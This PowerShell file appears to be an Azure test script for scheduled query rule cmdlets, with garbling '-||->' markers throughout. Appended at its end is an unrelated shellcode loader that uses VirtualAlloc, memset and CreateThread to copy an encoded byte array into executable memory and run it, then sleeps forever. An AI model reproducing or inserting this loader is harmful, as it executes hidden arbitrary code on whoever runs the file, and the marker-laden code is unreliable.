














 -||-> function Test-setup
{
	 -||-> $global:ruleName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $global:ruleName2 =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $global:ruleName3 =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $global:resourceGroupName =  -||-> Get-ResourceGroupName <-||-  <-||- 
	 -||-> $global:location =  -||-> Get-ProviderLocation( -||-> "microsoft.insights" <-||- ) <-||-  <-||- 
	 -||-> $global:description = "SQR log alert rule" <-||- 
	 -||-> $global:severity = "2" <-||- 
	 -||-> $global:throttlingInMin = "5" <-||- 
	 -||-> $global:enabled = 1 <-||- 
	 -||-> $global:emailSubject = "SQR Log alert trigger notification" <-||- 
	 -||-> $global:customWebhookPayload = "{}" <-||- 
	 -||-> $global:thresholdOperator = "GreaterThan" <-||- 
	 -||-> $global:threshold = 5 <-||- 
	 -||-> $global:metricTriggerType = "Total" <-||- 
	 -||-> $global:metricTriggerColumn = "timestamp" <-||- 
	 -||-> $global:frequencyInMin = 5 <-||- 
	 -||-> $global:timeWindowInMin = 5 <-||- 
	 -||-> $global:query = "traces | summarize AggregatedValue = count() by bin(timestamp, 5m)" <-||- 

	
	 -||-> New-AzResourceGroup -Name $resourceGroupName -Location $location -Force <-||- 

	 -||-> $appInsightsResourceName =  -||-> Get-ResourceName <-||-  <-||- 

	
	 -||-> $appInsightsResource =  -||-> New-AzureRmApplicationInsights `
	-Name $appInsightsResourceName `
	-ResourceGroupName $resourceGroupName `
	-Location $location <-||-  <-||- 

	
	 -||-> $actionGroupName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $email =  -||-> New-AzActionGroupReceiver -Name 'user1' -EmailReceiver -EmailAddress 'user1@example.com' <-||-  <-||- 
	 -||-> $newActionGroup =   -||-> Set-AzureRmActionGroup -Name $actionGroupName -ResourceGroup $resourceGroupName -ShortName ASTG -Receiver $email <-||-  <-||- 
	 -||-> $actionGroupResource =  -||-> New-AzActionGroup -ActionGroupId $newActionGroup.Id <-||-  <-||- 
	 -||-> $global:actionGroup = @( -||-> $newActionGroup.Id <-||- ) <-||- 
	
	 -||-> $global:subscription = ( -||-> Get-AzureRmContext <-||- ).Subscription <-||- 
	 -||-> $global:authorizedResources = "/subscriptions/" + $subscription + "/resourceGroups/" + $resourceGroupName + "/providers/microsoft.insights/components/" + $appInsightsResourceName <-||- 
	 -||-> $global:dataSourceId = $authorizedResources <-||- 
	 -||-> $global:queryType = "ResultCount" <-||- 
	 -||-> $global:metricTriggerThreshold = 10 <-||- 
	 -||-> $global:metricTriggerThresholdOperator = "GreaterThan" <-||- 

	 -||-> $global:tags = @{} <-||- 
} <-||- 

 -||-> function Verify-ScheduledQueryRule($scheduledQueryRule)
{
	 -||-> Assert-NotNull $scheduledQueryRule <-||- 
	
	 -||-> Assert-NotNull $scheduledQueryRule.Source <-||- 
	 -||-> Assert-NotNull $scheduledQueryRule.Schedule <-||- 
	
	 -||-> Assert-NotNull $scheduledQueryRule.Action <-||- 
	 -||-> Assert-NotNull $scheduledQueryRule.Action.Trigger <-||- 
	 -||-> Assert-NotNull $scheduledQueryRule.Action.Trigger.MetricTrigger <-||- 
	 -||-> Assert-NotNull $scheduledQueryRule.Action.AznsAction <-||- 

	 -||-> Assert-AreEqual $scheduledQueryRule.Name $ruleName <-||- 
	
	 -||-> Assert-AreEqual $scheduledQueryRule.Description $description <-||- 
	
	 -||-> Assert-AreEqual $scheduledQueryRule.Action.Severity $severity <-||- 
	 -||-> Assert-AreEqual $scheduledQueryRule.Action.ThrottlingInMin $throttlingInMin <-||- 
		
	 -||-> Assert-AreEqual $scheduledQueryRule.Action.Trigger.Threshold $threshold <-||- 
	 -||-> Assert-AreEqual $scheduledQueryRule.Action.Trigger.ThresholdOperator $thresholdOperator <-||- 

	 -||-> Assert-AreEqual $scheduledQueryRule.Action.Trigger.MetricTrigger.Threshold $metricTriggerThreshold <-||- 
	 -||-> Assert-AreEqual $scheduledQueryRule.Action.Trigger.MetricTrigger.ThresholdOperator $metricTriggerThresholdOperator <-||- 
	 -||-> Assert-AreEqual $scheduledQueryRule.Action.Trigger.MetricTrigger.MetricTriggerType $metricTriggerType <-||- 
	 -||-> Assert-AreEqual $scheduledQueryRule.Action.Trigger.MetricTrigger.MetricColumn $metricTriggerColumn <-||- 
	
	 -||-> Assert-AreEqual $scheduledQueryRule.Action.AznsAction.ActionGroup $actionGroup <-||- 
	 -||-> Assert-AreEqual $scheduledQueryRule.Action.AznsAction.EmailSubject $emailSubject <-||- 
	 -||-> Assert-AreEqual $scheduledQueryRule.Action.AznsAction.CustomWebhookPayload $customWebhookPayload <-||- 

	 -||-> Assert-AreEqual $scheduledQueryRule.Schedule.FrequencyInMinutes $frequencyInMin <-||- 
	 -||-> Assert-AreEqual $scheduledQueryRule.Schedule.TimeWindowInMinutes $timeWindowInMin <-||- 

	 -||-> Assert-AreEqual $scheduledQueryRule.Source.Query $query <-||- 
	 -||-> Assert-AreEqual $scheduledQueryRule.Source.DataSourceId $dataSourceId <-||- 
	 -||-> Assert-AreEqual $scheduledQueryRule.Source.AuthorizedResources $authorizedResources <-||- 
	 -||-> Assert-AreEqual $scheduledQueryRule.Source.QueryType $queryType <-||- 

} <-||- 


 -||-> function Test-NewGetUpdateSetRemoveScheduledQueryRule
{
	 -||-> Write-Debug "Starting Test-NewGetUpdateSetRemoveScheduledQueryRule" <-||- 
	 -||-> Test-setup <-||- 
	 -||-> try
	{
		 -||-> $aznsActionGroup =  -||-> New-AzScheduledQueryRuleAznsActionGroup -ActionGroup $actionGroup -EmailSubject $emailSubject -CustomWebhookPayload $customWebhookPayload <-||-  <-||- 

		 -||-> $metricTrigger =  -||-> New-AzScheduledQueryRuleLogMetricTrigger -ThresholdOperator $metricTriggerthresholdOperator -Threshold $metricTriggerThreshold -MetricTriggerType $metricTriggerType -MetricColumn $metricTriggerColumn <-||-  <-||- 

		 -||-> $triggerCondition =  -||-> New-AzScheduledQueryRuleTriggerCondition -ThresholdOperator $thresholdOperator -Threshold $threshold -MetricTrigger $metricTrigger <-||-  <-||- 

		 -||-> $alertingAction =  -||-> New-AzScheduledQueryRuleAlertingAction -AznsAction $aznsActionGroup -Severity $severity -ThrottlingInMinutes $throttlingInMin -Trigger $triggerCondition <-||-  <-||- 

		 -||-> $schedule =  -||-> New-AzScheduledQueryRuleSchedule -FrequencyInMinutes $frequencyInMin -TimeWindowInMinutes $timeWindowInMin <-||-  <-||- 

		 -||-> $source =  -||-> New-AzScheduledQueryRuleSource -Query $query -DataSourceId $dataSourceId -AuthorizedResource $authorizedResources -QueryType $queryType <-||-  <-||- 

		 -||-> $scheduledQueryRule =  -||-> New-AzScheduledQueryRule -Location $location -Name $ruleName -ResourceGroupName $resourceGroupName -Action $alertingAction -Source $source -Enabled $enabled -Description $description -Schedule $schedule -Tag $tags <-||-  <-||- 

         -||-> Verify-ScheduledQueryRule $scheduledQueryRule <-||- 
				
		 -||-> Write-Debug " ****** Getting the Scheduled Query Rule by name" <-||- 
		 -||-> $retrieved =  -||-> Get-AzScheduledQueryRule -ResourceGroup $resourceGroupName -Name $ruleName <-||-  <-||- 
		 -||-> Assert-NotNull $retrieved <-||- 
		 -||-> Assert-AreEqual 1 $retrieved.Length <-||- 
		 -||-> Verify-ScheduledQueryRule $retrieved[0] <-||- 
		
		 -||-> Write-Debug " ****** Getting the Scheduled Query Rule by subscriptionId" <-||- 
		 -||-> $retrieved =  -||-> Get-AzScheduledQueryRule <-||-  <-||- 
		 -||-> Assert-NotNull $retrieved <-||- 
		
		 -||-> Write-Debug " ****** Getting the Scheduled Query Rule by resource group" <-||- 
		 -||-> $retrieved =  -||-> Get-AzScheduledQueryRule -ResourceGroupName $resourceGroupName <-||-  <-||- 
		 -||-> Assert-NotNull $retrieved <-||- 
		 -||-> Assert-AreEqual 1 $retrieved.Length <-||- 
		 -||-> Verify-ScheduledQueryRule $retrieved[0] <-||- 

		

		 -||-> Write-Debug " ****** Updating Scheduled Query Rule by name (PUT semantics)" <-||- 
		 -||-> $updated =  -||-> Set-AzScheduledQueryRule -Location $location -Name $ruleName -ResourceGroupName $resourceGroupName -Action $alertingAction -Source $source -Enabled 1 -Description $description -Schedule $schedule -Tag $tags <-||-  <-||- 
		 -||-> Verify-ScheduledQueryRule $scheduledQueryRule <-||- 

		 -||-> Write-Debug " ****** Updating Scheduled Query Rule by resource Id (PUT semantics)" <-||- 
		 -||-> $updated =  -||-> Set-AzScheduledQueryRule -ResourceId $scheduledQueryRule.Id -Location $location -Action $alertingAction -Source $source -Enabled 1 -Description $description -Schedule $schedule -Tag $tags <-||-  <-||- 
		 -||-> Verify-ScheduledQueryRule $scheduledQueryRule <-||- 

		 -||-> Write-Debug " ****** Updating Scheduled Query Rule by InputObject (PUT semantics)" <-||- 
		 -||-> $updated =  -||-> Set-AzScheduledQueryRule -InputObject $scheduledQueryRule -Location $location -Action $alertingAction -Source $source -Enabled 1 -Description $description -Schedule $schedule -Tag $tags <-||-  <-||- 
		 -||-> Verify-ScheduledQueryRule $scheduledQueryRule <-||- 

		 -||-> Write-Debug " ****** Updating Scheduled Query Rule by name (PATCH semantics)" <-||- 
		 -||-> $updated =  -||-> Update-AzScheduledQueryRule -ResourceGroupName $resourceGroupName -Name $ruleName -Enabled 0 <-||-  <-||- 
		 -||-> Verify-ScheduledQueryRule $updated <-||- 
		 -||-> Assert-AreEqual $updated.Enabled false <-||- 

		 -||-> Write-Debug " ****** Updating Scheduled Query Rule by resource Id (PATCH semantics)" <-||- 
		 -||-> $updated =  -||-> Update-AzScheduledQueryRule -ResourceId $scheduledQueryRule.Id -Enabled 0 <-||-  <-||- 
		 -||-> Verify-ScheduledQueryRule $updated <-||- 
		 -||-> Assert-AreEqual $updated.Enabled false <-||- 

		 -||-> Write-Debug " ****** Updating Scheduled Query Rule by InputObject (PATCH semantics)" <-||- 
		 -||-> $updated =  -||-> Update-AzScheduledQueryRule -InputObject $scheduledQueryRule -Enabled 0 <-||-  <-||- 
		 -||-> Verify-ScheduledQueryRule $updated <-||- 
		 -||-> Assert-AreEqual $updated.Enabled false <-||- 

		 -||-> Write-Debug " ****** Removing Scheduled Query Rule by name" <-||- 
		 -||-> Remove-AzScheduledQueryRule -ResourceGroup $resourceGroupName -Name $ruleName <-||- 

		 -||-> Write-Debug " ****** Removing Scheduled Query Rule by resource Id" <-||- 
		 -||-> Remove-AzScheduledQueryRule -ResourceId $scheduledQueryRule.Id <-||- 

		 -||-> Write-Debug " ****** Removing Scheduled Query Rule by InputObject" <-||- 
		 -||-> Remove-AzScheduledQueryRule -InputObject $scheduledQueryRule <-||- 
    }
	catch
	{
		
		throw  -||-> $_ <-||- 
	}
    finally
    {
        
         -||-> Clean-ResourceGroup( -||-> $resourceGroupName <-||- ) <-||- 
    } <-||- 
} <-||- 

 -||-> function Test-PipingRemoveSetUpdateScheduledQueryRule
{
	 -||-> Write-Debug "Starting Test-PipingRemoveSetUpdateScheduledQueryRule" <-||- 
	 -||-> Test-setup <-||- 
	 -||-> try
	{
		 -||-> $aznsActionGroup =  -||-> New-AzScheduledQueryRuleAznsActionGroup -ActionGroup $actionGroup -EmailSubject $emailSubject -CustomWebhookPayload $customWebhookPayload <-||-  <-||- 

		 -||-> $metricTrigger =  -||-> New-AzScheduledQueryRuleLogMetricTrigger -ThresholdOperator $metricTriggerthresholdOperator -Threshold $metricTriggerThreshold -MetricTriggerType $metricTriggerType -MetricColumn $metricTriggerColumn <-||-  <-||- 

		 -||-> $triggerCondition =  -||-> New-AzScheduledQueryRuleTriggerCondition -ThresholdOperator $thresholdOperator -Threshold $threshold -MetricTrigger $metricTrigger <-||-  <-||- 

		 -||-> $alertingAction =  -||-> New-AzScheduledQueryRuleAlertingAction -AznsAction $aznsActionGroup -Severity $severity -ThrottlingInMinutes $throttlingInMin -Trigger $triggerCondition <-||-  <-||- 

		 -||-> $schedule =  -||-> New-AzScheduledQueryRuleSchedule -FrequencyInMinutes $frequencyInMin -TimeWindowInMinutes $timeWindowInMin <-||-  <-||- 

		 -||-> $source =  -||-> New-AzScheduledQueryRuleSource -Query $query -DataSourceId $dataSourceId -AuthorizedResource $authorizedResources -QueryType $queryType <-||-  <-||- 

		 -||-> $scheduledQueryRule =  -||-> New-AzScheduledQueryRule -Location $location -Name $ruleName -ResourceGroupName $resourceGroupName -Action $alertingAction -Source $source -Enabled $enabled -Description $description -Schedule $schedule -Tag $tags <-||-  <-||- 

         -||-> Verify-ScheduledQueryRule $scheduledQueryRule <-||- 
         -||-> $resourceId = $scheduledQueryRule.Id <-||- 

		 -||-> Write-Debug " ****** Updating Scheduled Query Rule by name" <-||- 
		 -||-> $retrieved =  -||-> Get-AzScheduledQueryRule -ResourceGroup $resourceGroupName -Name $ruleName | Update-AzScheduledQueryRule -Enabled 0 <-||-  <-||- 

		 -||-> Verify-ScheduledQueryRule $retrieved <-||- 
		 -||-> Assert-AreEqual $retrieved.Enabled false <-||- 

		 -||-> $retrieved =  -||-> Get-AzScheduledQueryRule -ResourceGroup $resourceGroupName -Name $ruleName | Set-AzScheduledQueryRule <-||-  <-||- 
		 -||-> Verify-ScheduledQueryRule $retrieved <-||- 
		
		 -||-> Write-Debug " ****** Updating Scheduled Query Rule by Resource Id" <-||- 
		 -||-> $retrieved =  -||-> Get-AzScheduledQueryRule -ResourceId $resourceId | Update-AzScheduledQueryRule -Enabled 1 <-||-  <-||- 
		 -||-> Assert-AreEqual $retrieved.Enabled true <-||- 
		 -||-> Verify-ScheduledQueryRule $retrieved <-||- 
		
         -||-> $retrieved =  -||-> Get-AzScheduledQueryRule -ResourceId $resourceId | Set-AzScheduledQueryRule <-||-  <-||- 
		 -||-> Verify-ScheduledQueryRule $retrieved <-||- 

		 -||-> Write-Debug " ****** Removing Scheduled Query Rule by name" <-||- 
		 -||-> $retrieved =  -||-> Get-AzScheduledQueryRule -ResourceGroup $resourceGroupName -Name $ruleName | Remove-AzScheduledQueryRule <-||-  <-||- 
		 -||-> Assert-Null $retrieved <-||- 
		
		 -||-> $scheduledQueryRule =  -||-> New-AzScheduledQueryRule -Location $location -Name $ruleName2 -ResourceGroupName $resourceGroupName -Action $alertingAction -Source $source -Enabled $enabled -Description $description -Schedule $schedule -Tag $tags <-||-  <-||- 

		 -||-> Write-Debug " ****** Removing Scheduled Query Rule by Resource Id" <-||- 
		 -||-> $retrieved =  -||-> Get-AzScheduledQueryRule -ResourceId $scheduledQueryRule.Id | Remove-AzScheduledQueryRule <-||-  <-||- 
		 -||-> Assert-Null $retrieved <-||- 

		 -||-> $scheduledQueryRule =  -||-> New-AzScheduledQueryRule -Location $location -Name $ruleName3 -ResourceGroupName $resourceGroupName -Action $alertingAction -Source $source -Enabled $enabled -Description $description -Schedule $schedule -Tag $tags <-||-  <-||- 
		
		 -||-> Write-Debug " ****** Removing Scheduled Query Rules in ResourceGroup" <-||- 
		 -||-> $retrieved =  -||-> Get-AzScheduledQueryRule -ResourceGroupName $resourceGroupName | Remove-AzScheduledQueryRule <-||-  <-||- 
		 -||-> Assert-Null $retrieved <-||- 

		
		
		
		
	}
	catch
	{
		
		throw  -||-> $_ <-||- 
	}
	finally
	{
		 -||-> Clean-ResourceGroup( -||-> $resourceGroupName <-||- ) <-||- 
	} <-||- 
} <-||- 


 -||-> $Isc2 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $Isc2 -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xdb,0xc8,0xb8,0x57,0x33,0x24,0xe9,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x43,0x18,0x83,0xeb,0xfc,0x03,0x43,0x43,0xd1,0xd1,0x15,0x83,0x97,0x1a,0xe6,0x53,0xf8,0x93,0x03,0x62,0x38,0xc7,0x40,0xd4,0x88,0x83,0x05,0xd8,0x63,0xc1,0xbd,0x6b,0x01,0xce,0xb2,0xdc,0xac,0x28,0xfc,0xdd,0x9d,0x09,0x9f,0x5d,0xdc,0x5d,0x7f,0x5c,0x2f,0x90,0x7e,0x99,0x52,0x59,0xd2,0x72,0x18,0xcc,0xc3,0xf7,0x54,0xcd,0x68,0x4b,0x78,0x55,0x8c,0x1b,0x7b,0x74,0x03,0x10,0x22,0x56,0xa5,0xf5,0x5e,0xdf,0xbd,0x1a,0x5a,0xa9,0x36,0xe8,0x10,0x28,0x9f,0x21,0xd8,0x87,0xde,0x8e,0x2b,0xd9,0x27,0x28,0xd4,0xac,0x51,0x4b,0x69,0xb7,0xa5,0x36,0xb5,0x32,0x3e,0x90,0x3e,0xe4,0x9a,0x21,0x92,0x73,0x68,0x2d,0x5f,0xf7,0x36,0x31,0x5e,0xd4,0x4c,0x4d,0xeb,0xdb,0x82,0xc4,0xaf,0xff,0x06,0x8d,0x74,0x61,0x1e,0x6b,0xda,0x9e,0x40,0xd4,0x83,0x3a,0x0a,0xf8,0xd0,0x36,0x51,0x94,0x15,0x7b,0x6a,0x64,0x32,0x0c,0x19,0x56,0x9d,0xa6,0xb5,0xda,0x56,0x61,0x41,0x1d,0x4d,0xd5,0xdd,0xe0,0x6e,0x26,0xf7,0x26,0x3a,0x76,0x6f,0x8f,0x43,0x1d,0x6f,0x30,0x96,0x88,0x6a,0xa6,0xd9,0xe5,0x74,0xf7,0xb2,0xf7,0x76,0xe8,0xd2,0x71,0x90,0x46,0x83,0xd1,0x0d,0x26,0x73,0x92,0xfd,0xce,0x99,0x1d,0x21,0xee,0xa1,0xf7,0x4a,0x84,0x4d,0xae,0x23,0x30,0xf7,0xeb,0xb8,0xa1,0xf8,0x21,0xc5,0xe1,0x73,0xc6,0x39,0xaf,0x73,0xa3,0x29,0x47,0x74,0xfe,0x10,0xc1,0x8b,0xd4,0x3f,0xed,0x19,0xd3,0xe9,0xba,0xb5,0xd9,0xcc,0x8c,0x19,0x21,0x3b,0x87,0x90,0xb7,0x84,0xff,0xdc,0x57,0x05,0xff,0x8a,0x3d,0x05,0x97,0x6a,0x66,0x56,0x82,0x74,0xb3,0xca,0x1f,0xe1,0x3c,0xbb,0xcc,0xa2,0x54,0x41,0x2b,0x84,0xfa,0xba,0x1e,0x14,0xc6,0x6c,0x66,0x62,0x26,0xad <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $QFYc=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $QFYc.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$QFYc,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



